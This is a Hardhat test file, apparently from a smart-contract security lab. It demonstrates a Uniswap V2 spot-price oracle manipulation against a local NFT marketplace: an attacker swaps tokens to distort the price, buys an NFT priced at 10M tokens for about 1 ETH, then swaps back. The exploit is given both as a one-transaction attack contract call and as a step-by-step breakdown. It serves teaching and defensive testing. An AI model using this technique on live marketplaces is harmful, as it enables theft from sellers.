const { expect } = require("chai");
const { ethers } = require("hardhat");

const uniswapV2Pair = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const uniswapV2Factory = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const uniswapV2Router = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const PAIR_TOKEN_RESERVE = ethers.utils.parseEther("100");
const PAIR_WETH_RESERVE = ethers.utils.parseEther("1");

const ATTACKER_TOKEN_INITIAL = ethers.utils.parseEther("100000");
const ATTACKER_ETH_INITIAL = ethers.utils.parseEther("20");

describe("NftMarketplace On-Chain PriceOracle v1", function () {
  
  async function deploy() {
    /// Get accounts
    let [deployer, seller, attacker] = await ethers.getSigners();

    /// Deploy environment contracts
    const UniSwapV2_Pair = new ethers.ContractFactory(uniswapV2Pair.abi, uniswapV2Pair.bytecode, deployer);
    const UniswapV2_Factory = new ethers.ContractFactory(uniswapV2Factory.abi, uniswapV2Factory.bytecode, deployer);
    const UniswapV2_Router = new ethers.ContractFactory(uniswapV2Router.abi, uniswapV2Router.bytecode, deployer);
    const ERC20WithInitialSupply = await ethers.getContractFactory("ERC20WithInitialSupply");
    const MockWETH = await ethers.getContractFactory("MockWETH");

    /// Deploy token contracts
    const initSupply = ATTACKER_TOKEN_INITIAL.add(PAIR_TOKEN_RESERVE)
    const token = await ERC20WithInitialSupply.connect(deployer).deploy("Inspex Token", "INX", initSupply);
    const weth = await MockWETH.connect(deployer).deploy();
    
    const uniswapFactory = await UniswapV2_Factory.connect(deployer).deploy(ethers.constants.AddressZero);
    const uniswapRouter = await UniswapV2_Router.connect(deployer).deploy(uniswapFactory.address, weth.address);

    /// Create new pair
    await token.approve(
      uniswapRouter.address,
      PAIR_TOKEN_RESERVE
    );
    await uniswapRouter.connect(deployer).addLiquidityETH(
      token.address,
      PAIR_TOKEN_RESERVE,
      0,
      0,
      deployer.address,
      (await ethers.provider.getBlock('latest')).timestamp + 100,
      { value: PAIR_WETH_RESERVE}
    )
    const pairAddress = await uniswapFactory.getPair(token.address, weth.address);
    const uniswapPair = UniSwapV2_Pair.attach(pairAddress);

    /// Deploy testing contracts    
    const ERC721OneSupply = await ethers.getContractFactory("ERC721OneSupply");
    const NftMarketplace_PriceOracle_OnChain_v1 = await ethers.getContractFactory("NftMarketplace_PriceOracle_OnChain_v1");
    const nft = await ERC721OneSupply.connect(deployer).deploy("Inspex NFT", "iNFT");
    const marketplace = await NftMarketplace_PriceOracle_OnChain_v1.connect(deployer).deploy(weth.address, uniswapFactory.address);

    /// Airdrop NFT to seller
    const nftId = 0;
    await nft.connect(deployer).transferFrom(deployer.address, seller.address, nftId);
    /// Airdrop token to attacker
    await token.connect(deployer).transfer(attacker.address, ATTACKER_TOKEN_INITIAL);
    /// Set native token in attack account
    const amountToRpcQuantity = ATTACKER_ETH_INITIAL.toHexString().replace("0x0", "0x");
    await ethers.provider.send("hardhat_setBalance",[attacker.address, amountToRpcQuantity]);

    return { uniswapFactory, uniswapRouter, uniswapPair, marketplace, weth, token, nft, seller, attacker, deployer };
  }

  async function sellerCreateAnOffer(marketplace, nft, token, seller) {
    const priceAsINX = ethers.utils.parseEther("10000000"); /// 10M INX
    const nftId = 0;
    await nft.connect(seller).approve(marketplace.address, nftId);
    const createOfferTX = await marketplace.connect(seller).createOffer(
      nft.address,
      nftId,
      token.address,
      priceAsINX
    );
    const createOfferTXData = await createOfferTX.wait();
    const createOfferTXEvent = await createOfferTXData.events.find(event => event.event === "CreateOffer");
    const [, offerId, ] = createOfferTXEvent.args; /// offerId = 0
    return {priceAsINX, nftId, offerId};
  }

  async function checkBalance(attacker, token, weth) {
    const attackerETH = await ethers.provider.getBalance(attacker.address);
    const attackerWETH = await weth.balanceOf(attacker.address);
    const attackerToken = await token.balanceOf(attacker.address);
    console.log(`  ETH.balanceOf(attacker)  : ${ethers.utils.formatEther(attackerETH)} ETH`);
    console.log(`  WETH.balanceOf(attacker) : ${ethers.utils.formatEther(attackerWETH)} WETH`);
    console.log(`  INX.balanceOf(attacker)  : ${ethers.utils.formatEther(attackerToken)} INX`);
    return { attackerETH, attackerToken };
  }

  async function checkNftPriceAsEth(marketplace, token, priceAsINX) {
    let priceAsETH = await marketplace.convertToWETHAmount(token.address, priceAsINX);
    console.log(`  NFT's price as INX: ${ethers.utils.formatEther(priceAsINX)} INX`);
    console.log(`  NFT's price as ETH: ${ethers.utils.formatEther(priceAsETH)} ETH`);
  }

  describe("Deployment", () => {
    it("Deploy NftMarketplace_PriceOracle_OnChain_v1", async () => {
      const { uniswapFactory, uniswapRouter, uniswapPair, marketplace, weth, token, nft, seller, attacker, deployer } = await deploy();
      expect(await nft.ownerOf(0)).to.equal(seller.address);
      expect(await uniswapPair.balanceOf(deployer.address)).to.be.gt(0);
      expect(await token.balanceOf(attacker.address)).to.be.eq(ATTACKER_TOKEN_INITIAL);
      expect(await ethers.provider.getBalance(attacker.address)).to.be.eq(ATTACKER_ETH_INITIAL);
    });
  });

  describe("UniswapV2's pair price manipulation", () => {

    it("[Attack in one TX]  The attacker manipulates the price by swapping a large amount of INX, then buying the NFT with WETH at the manipulated price.", async () => {
      const { uniswapFactory, uniswapRouter, uniswapPair, marketplace, weth, token, nft, seller, attacker } = await deploy();

      /*
        Seller create a offer: selling NFT ID:0 for 10M INX
      */
      const {priceAsINX, nftId, offerId} = await sellerCreateAnOffer(marketplace, nft, token, seller);

      console.log(`\n=== Before the attack ===`);
      await checkBalance(attacker, token, weth);

      /*
        Attacker create a contract and then execute attack()
      */
      const AttackerOnChianV1 = await ethers.getContractFactory("AttackerOnChianV1");
      const attackerContract = await AttackerOnChianV1.connect(attacker).deploy();
      const tokenBalance = await token.connect(attacker).balanceOf(attacker.address);
      await token.connect(attacker).approve(attackerContract.address, tokenBalance);
      /// attack in one TX
      await attackerContract.connect(attacker).attack(
        uniswapRouter.address,
        marketplace.address,
        token.address,
        weth.address,
        nft.address,
        tokenBalance,
        nftId,
        priceAsINX,
        offerId,
        {
          value: ethers.utils.parseEther("0.11"),
          gasLimit:30000000
        }
      );

      console.log(`\n=== After the attack ===`);
      await checkBalance(attacker, token, weth);

      expect(await nft.ownerOf(nftId)).to.be.eq(attacker.address);
    });

    it("[Breakdown] The attacker manipulates the price by swapping a large amount of INX, then buying the NFT with WETH at the manipulated price.", async () => {
      const { uniswapFactory, uniswapRouter, uniswapPair, marketplace, weth, token, nft, seller, attacker } = await deploy();

      /*
        Seller create a offer: selling NFT ID:0 for 10M INX
      */
      const {priceAsINX, nftId, offerId} = await sellerCreateAnOffer(marketplace, nft, token, seller);

      /* 
        Before the attack
      */
      console.log(`\n=== Before the attack ===`);
      await checkNftPriceAsEth(marketplace, token, priceAsINX);
      await checkBalance(attacker, token, weth);

      /*
        The attack
        1) Swap all INX for WETH to inflate the price
        2) Buy NFT ID:0 in manipulated price (~1 ETH)
        3) Swap WETH back to INX
      */
      console.log(`\n=== During the attack ===`);
      /// 1) Swap INX to WETH to manipulate the price
      let exactAmountIn = await token.balanceOf(attacker.address);
      let deadline = parseInt((await ethers.provider.getBlock('latest')).timestamp) + 1000;
      let amountOutmin = 0;
      await token.connect(attacker).approve(uniswapRouter.address, exactAmountIn);
      await uniswapRouter.connect(attacker).swapExactTokensForTokens(
        exactAmountIn,
        amountOutmin,
        [token.address, weth.address],
        attacker.address,
        deadline,
        {gasLimit:300000}
      );
      
      /// Log info
      console.log(`-After step 1):`);
      await checkNftPriceAsEth(marketplace, token, priceAsINX);
      await checkBalance(attacker, token, weth);

      /// 2) Buy NFT ID:0 by paying with WETH
      const payingWithWeth = true
      const nftPriceAsWeth = await marketplace.convertToWETHAmount(token.address, priceAsINX);
      await weth.connect(attacker).deposit({value: nftPriceAsWeth});
      await weth.connect(attacker).approve(marketplace.address, nftPriceAsWeth);
      await marketplace.connect(attacker).acceptOffer(nft.address, offerId, payingWithWeth);

      /// Log info
      console.log(`-After step 2):`);
      console.log(`  attacker.address: ${attacker.address}`);
      console.log(`  NFT.ownerOf(0)  : ${await nft.ownerOf(nftId)}`);


      /// 3) Swap WETH back to INX
      exactAmountIn = await weth.balanceOf(attacker.address);
      deadline = parseInt((await ethers.provider.getBlock('latest')).timestamp) + 1000;
      amountOutmin = 0;
      await weth.connect(attacker).approve(uniswapRouter.address, exactAmountIn);
      await uniswapRouter.connect(attacker).swapExactTokensForTokens(
        exactAmountIn,
        amountOutmin,
        [weth.address, token.address],
        attacker.address,
        deadline,
        {gasLimit:300000}
      );
      
      /// Log info
      console.log(`-After step 3):`);
      const { attackerETH, attackerToken } = await checkBalance(attacker, token, weth);

      /* 
        After the attack
      */
      console.log(`\n=== After the attack ===`);
      const tokenPaid = ATTACKER_TOKEN_INITIAL.sub(attackerToken);
      const ethPaid = ATTACKER_ETH_INITIAL.sub(attackerETH);
      console.log(`-Summary: the attacker only paid the following tokens to get the NFT:`);
      console.log(`  INX: ${ethers.utils.formatEther(tokenPaid)} INX`);
      console.log(`  ETH: ${ethers.utils.formatEther(ethPaid)} ETH`);

      expect(await nft.ownerOf(nftId)).to.be.eq(attacker.address);
    });
  });
});